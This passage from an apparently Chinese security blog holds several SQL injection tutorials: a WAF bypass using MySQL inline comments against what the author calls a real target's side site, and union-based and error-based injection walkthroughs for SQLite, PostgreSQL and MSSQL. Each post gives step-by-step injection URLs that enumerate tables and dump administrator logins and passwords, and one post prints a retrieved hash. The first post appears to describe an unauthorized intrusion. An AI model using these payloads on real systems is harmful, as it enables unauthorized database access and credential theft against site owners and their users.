            <p>0x01 前言<br>&nbsp;&nbsp;&nbsp;&nbsp;昨天在搞一个目标的旁站时凑巧又碰到了waf,当然啦,这个waf比较弱,基本是弱到没朋友的那种,但为了博客的完整性,这里还是顺便就记录一下,留给有需要的朋友,方法非常简单,关于bypass waf的东西其实特别多,这里暂时只提一种,”内联注释”,招数早已经烂大街了,后续再遇到其它的bypass实例,也会继续更新到博客上,废话少说,看实例吧:</p>
<p>0x02 依旧是先判断注入点是否存在,很显然,’and’没有拦<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1212=1212  返回正常</span></span><br><span class="line"><span class="regexp">http:/</span><span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1212=121   返回异常,注入存在</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf test.png" alt="&#39;&#39;"><br><img src="/img/waf test 1.png" alt="&#39;&#39;"></p>
<p>0x03 我们观察到,当字段个数为11的时候页面返回正常,说明当前表字段个数为11个,’order by’ 也没有拦,到这里为止,凭着一点经验自己心里就有种感觉,这个waf肯定非常好过,接着往下看吧<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 OrDer by 11</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf test order by .png" alt="&#39;&#39;"></p>
<p>0x04 开始搜集信息,这时我们发现waf似乎开始起作用了,拦了我们的内置函数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,user(),version(),database(),6,7,8,9,10,11 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf test lanjie.png" alt="&#39;&#39;"></p>
<p>0x05 既然拦了函数,咱们就把函数给注释一下看看,然后就这么容易的通过了[以为还要折腾很久],好吧,既然它对这种内联注释感冒,那后面我就把所有的关键字都用这种方式包起来,省的我一个个猜它到底拦哪个<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 And 1=12 +UNION+ALL+SELECT+1,2,/</span>*!user()*<span class="regexp">/,version(),database(),6,7,8,9,10,11 --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf version bypass.png" alt="&#39;&#39;"></p>
<p>0x06 查询当前库中的所有表,这类我们看到了’t_admin’这张管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 aNd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(table_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.tables*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_schema*<span class="regexp">/=0x686e797075686b315f7363686f6f6c --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf version bypass admin.png" alt="&#39;&#39;"></p>
<p>0x07 查询’t_admin’表中的所有字段名,如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 ANd 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!group_concat(column_name)*<span class="regexp">/,/</span>*!version()*<span class="regexp">/,/</span>*!database()*<span class="regexp">/,6,7,8,9,10,11 from /</span>*!information_schema.columns*<span class="regexp">/ /</span>*!where*<span class="regexp">/ /</span>*!table_name*<span class="regexp">/=0x745f61646d696e --+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf version bypass columns.png" alt="&#39;&#39;"></p>
<p>0x08 就剩最后一步了,查出管理员的账号密码即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/www.target.com/news</span><span class="regexp">/show1.php?id=1102 anD 1=12 +/</span>*!UNION+ALL+SELECT*<span class="regexp">/+1,2,/</span>*!admin_name*<span class="regexp">/,/</span>*!admin_password*<span class="regexp">/,5,6,7,8,9,10,11 from /</span>*!t_admin*<span class="regexp">/ /</span>*!limit*<span class="regexp">/ 0,1--+-</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/waf version bypass data.png" alt="&#39;&#39;"><br></p>
<p>小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;没啥实际的技术含量,只是为了博客完整性稍作记录而已,关于bypass waf后续还会有很多的篇幅来说明,待续…<br></p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/19/sqlite3-common-injection/">
                sql注入入门 之 sqlite3常规注入 [ union方式 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-19</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,本次 sqlite3 实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span>&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection.png" alt="&#39;&#39;"><br></p>
<p>2,依旧是迷人的单引号,尝试干扰id参数,返回sqlite数据库报错,具体报错信息如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span><span class="string">'&amp;ca=7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection1.png" alt="&#39;&#39;"><br></p>
<p>3,尝试闭合<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> &amp;ca=<span class="number">7</span>    条件为真时,页面返回正常,数字型注入</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection2.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> &amp;ca=<span class="number">7</span>  条件为假时,页面</span><br></pre></td></tr></table></figure>
<p><img src="/img/sqlite3_common_injection3.png" alt="&#39;&#39;"><br></p>
<p>4,查询当前表中的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> order by <span class="number">38</span> &amp;ca=<span class="number">7</span> 个数为<span class="number">38</span>时返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection4.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> order by <span class="number">39</span> &amp;ca=<span class="number">7</span>  个数为<span class="number">39</span>时返回错误,说明当前表存在<span class="number">38</span>个字段</span><br></pre></td></tr></table></figure>
<p><img src="/img/sqlite3_common_injection5.png" alt="&#39;&#39;"><br></p>
<p>8,执行union爆出对应的数据显示位,这个的显示位稍微有点儿跑偏,数据显示位在title标记里,你可以右键源代码进行查看<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>--&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection6.png" alt="&#39;&#39;"><br></p>
<p>9,有了数据位,接下来正常的查数据就可以了,还是先搜集下数据库信息,获取当前sqlite版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,sqlite_version(),<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span>--&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection7.png" alt="&#39;&#39;"><br></p>
<p>10,查出所有表名,这里可以用burpsuite来跑比较方便<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,name,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM sqlite_master WHERE type=<span class="string">'table'</span> limit <span class="number">0</span>,<span class="number">1</span> --&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection8.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection9.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection10.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection11.png" alt="&#39;&#39;"><br></p>
<p>11,直接一次性查出所有表名及每张表所对应的表结构<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,sql,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM sqlite_master WHERE type=<span class="string">'table'</span> limit <span class="number">0</span>,<span class="number">1</span>  --&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection12.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection13.png" alt="&#39;&#39;"><br><br><img src="/img/sqlite3_common_injection14.png" alt="&#39;&#39;"><br></p>
<p>12,查出对应字段下的账号密码数据<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/index</span>.php?id=<span class="number">50</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">123</span> UNION SELECT <span class="number">1</span>,login<span class="params">||</span><span class="string">'::'</span><span class="params">||</span>pass,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span>,<span class="number">13</span>,<span class="number">14</span>,<span class="number">15</span>,<span class="number">16</span>,<span class="number">17</span>,<span class="number">18</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span>,<span class="number">27</span>,<span class="number">28</span>,<span class="number">29</span>,<span class="number">30</span>,<span class="number">31</span>,<span class="number">32</span>,<span class="number">33</span>,<span class="number">34</span>,<span class="number">35</span>,<span class="number">36</span>,<span class="number">37</span>,<span class="number">38</span> FROM utilisateurs limit <span class="number">0</span>,<span class="number">1</span>  --&amp;ca=<span class="number">7</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/sqlite3_common_injection15.png" alt="&#39;&#39;"><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于sqlite注入实在没什么好说的,非常简单,作为access的替代品,在注入方式上几乎没什么不同,多找实例练习即可……</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/18/postgresql-common-injection/">
                sql注入入门 之 postgresql常规注入 [ union方式 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-18</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,用于演示的 postgresql 常规注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection.png" alt="&#39;&#39;"><br></p>
<p>2,依然是一个神奇的单引号,pgsql返回报错,这里可能需要您稍微注意下pgsql的报错信息,pg_前缀一般指的都是postgresql数据库,而像ora前缀一般指的都是oracle数据库,mysql一般都是mysql的前缀,稍微注意下就行<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection1.png" alt="&#39;&#39;"><br></p>
<p>3,典型的常规数字型注入<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 	条件为真时,页面返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection2.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span>  条件为假时,页面返回异常</span><br></pre></td></tr></table></figure>
<p><img src="/img/pg_union_injection3.png" alt="&#39;&#39;"><br></p>
<p>4,查询当前表的字段个数<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> order by <span class="number">4</span>  字段个数为<span class="number">4</span>时返回正常</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection4.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> order by <span class="number">5</span>  字段个数为<span class="number">5</span>时返回错误,可知当前表的字段个数为<span class="number">4</span>个</span><br></pre></td></tr></table></figure>
<p><img src="/img/pg_union_injection5.png" alt="&#39;&#39;"><br></p>
<p>5,因为postgresql不支持像mysql或者access那样直接用数字来表示,所以这里只能用null来表示,null可以兼容任意数据类型嘛,sqlmap默认都是用null进行探测<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,null,null,null --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection6.png" alt="&#39;&#39;"><br></p>
<p>6,在得知确切的字段个数后,紧接着就该爆出数据显示位了,这里依然不像数字那么直接,我们需要逐个字段尝试可以正常显示数据的字段位,因为union要求前后的数据字段类型和个数都要完全一致才可以,利用这一特性,我们可以知道某个字段是什么数据类型,可以看到第二个字段是字符型的,也就是说我们等会儿可以把查出来的数据都显示在这个字段上<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,<span class="string">'s'</span>,null,null --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection7.png" alt="&#39;&#39;"><br></p>
<p>7,搜集数据库的各种信息<br>获取当前数据库版本<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,version(),null,null --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection8.png" alt="&#39;&#39;"><br></p>
<p>获取当前数据库用户名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,current_user,null,null --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection9.png" alt="&#39;&#39;"><br></p>
<p>获取当前当前数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,current_database(),null,null--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection11.png" alt="&#39;&#39;"><br></p>
<p>8,获取当前数据库中所有具有dba(数据库管理员)权限的用户,同样是利用limit即可依次遍历出所有具有dba权限的用户名,只不过这里的limit和mysql中的limit有点儿不大一样,中间并不是用逗号而是直接用了个offset关键字,来设置偏移量<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,usename,null,null FROM pg_user WHERE usesuper IS TRUE limit <span class="number">1</span> offset <span class="number">0</span>--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection10.png" alt="&#39;&#39;"><br></p>
<p>9,获取所有的数据库名(有权限看到的所有数据库名),同样是利用limit即可依次遍历出所有数据库名,实际注入中,用burupsuite跑下即可<br>如下,获取第一个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,datname,null,null from pg_database limit <span class="number">1</span> offset <span class="number">0</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection12.png" alt="&#39;&#39;"><br></p>
<p>如下,获取第二个数据库名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,datname,null,null from pg_database limit <span class="number">1</span> offset <span class="number">1</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection13.png" alt="&#39;&#39;"><br></p>
<p>10,获取当前库中所有的表名<br>获取第一张表名<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,tablename,null,null from pg_tables where schemaname=<span class="string">'public'</span>  limit <span class="number">1</span> offset <span class="number">0</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection14.png" alt="&#39;&#39;"><br></p>
<p>获取第二张表名,看到’users’ 正是我们想要的管理表<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,tablename,null,null from pg_tables where schemaname=<span class="string">'public'</span>  limit <span class="number">1</span> offset <span class="number">1</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection15.png" alt="&#39;&#39;"><br></p>
<p>11,获取users表中的所有字段名<br>获取users表中的第二个字段名,其结果为’password’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,column_name,null,null from information_schema.columns where table_name=<span class="string">'users'</span> limit <span class="number">1</span> offset <span class="number">1</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection16.png" alt="&#39;&#39;"><br></p>
<p>获取user表中的第三个字段名,其结果为’login’<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,column_name,null,null from information_schema.columns where table_name=<span class="string">'users'</span> limit <span class="number">1</span> offset <span class="number">2</span> --</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection17.png" alt="&#39;&#39;"><br></p>
<p>12,获取对应账号密码字段的数据即可<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.3.51/cat</span>.php?id=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">12</span> union select null,login<span class="params">||</span><span class="string">'::'</span><span class="params">||</span>password,null,null from public.users--</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/pg_union_injection18.png" alt="&#39;&#39;"><br></p>
<p>最终,获取到的数据如下<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin::<span class="number">8</span>efe310f9ab3efeae8d410a8e0166eb2</span><br></pre></td></tr></table></figure></p>
<p><br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;关于pgsql的常规手注大概就这些了,跟mysql还有mssql的注入都非常接近,比较简单,就不多说了,大家多练习,多实战,然后不断解决实际中遇到的各种各样的问题,长此以往快就能慢慢积累自己的实战经验了,进步自然就稳健多了……</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2016/05/17/mssql-error-injection/">
                sql注入入门 之 mssql常规显错注入
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2016-05-17</span>
            
            
            
                <span class="category">
                    <a href="/categories/all-sql-injection/">all sql injection</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>1,mssql常规显错型,实例注入点,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection1.png" alt="&#39;&#39;"><br></p>
<p>2,依旧先尝试经典的单引号,数据库如期报错,报错原因的很清楚,参数后面多了单引号,不过这也恰好说明我们的单引号已被带入正常查询,其实,到此为止,根据以往的经验我们也可以判断这里百分之九十是个mssql注入点,因为这很显然不是其他数据库的报错信息嘛<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span><span class="string">'</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/mssql_error_injection2.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span>  条件为真,页面返回正常</span><br></pre></td></tr></table></figure>
<p><img src="/img/mssql_error_injection3.png" alt="&#39;&#39;"><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/vuln.com/</span>Product.aspx?id=<span class="number">8</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">112</span> 条件为真,页面返回异常,典型的数字型注入</span><br></pre></td></tr></table></figure>
<p><img src="/img/mssql_error_injection4.png" alt="&#39;&#39;"><br></p>
